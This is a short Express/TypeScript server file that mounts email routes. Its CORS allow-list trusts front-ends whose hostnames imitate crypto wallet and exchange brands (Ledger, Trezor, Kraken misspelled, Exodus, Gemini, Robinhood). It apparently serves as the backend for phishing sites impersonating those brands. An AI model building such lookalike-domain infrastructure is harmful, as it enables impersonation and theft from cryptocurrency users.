import express, { Request, Response } from "express";
import dotenv from "dotenv";
import cors from "cors";
import emailRoutes from "./routes/email.routes";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware 
app.use(cors({
    origin: ["https://s3demo.vercel.app" ,"https://ledger-six-sigma.vercel.app", "https://ledger-six-sigma-dfasf324324-343244-america-44343434.vercel.app" ,"http://localhost:3000",
            "https://robinhood-white-nine-sigma-dfasf324324-343244-dubai-44343434.vercel.app",
            "https://kreken-white-five-sigma-dfasf-324324-343244-iran.vercel.app",
            "https://trezor-website-five-sigma-dfasf-324324-343244-iraq.vercel.app",
            "https://exodus-ten-five-sigma-dfasf-98457-343564-goa.vercel.app",
            "https://i-trust-capital-green--sigma-four-dfasf-56748-343244-bhutan.vercel.app",
            "https://gemini-eight-wheat-sigma-dfasf-324324-343244.vercel.app",
             // AWS URL
             "https://main.dcytem5jqmxjf.amplifyapp.com",
             "https://main.dl1l0wtr7nwnp.amplifyapp.com",
            ],
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
    credentials: true,
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get("/api/v1", (req: Request, res: Response) => {
    res.send("API v1 is working!");
});

// ✅ Mount email routes
app.use("/api/v1", emailRoutes);

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
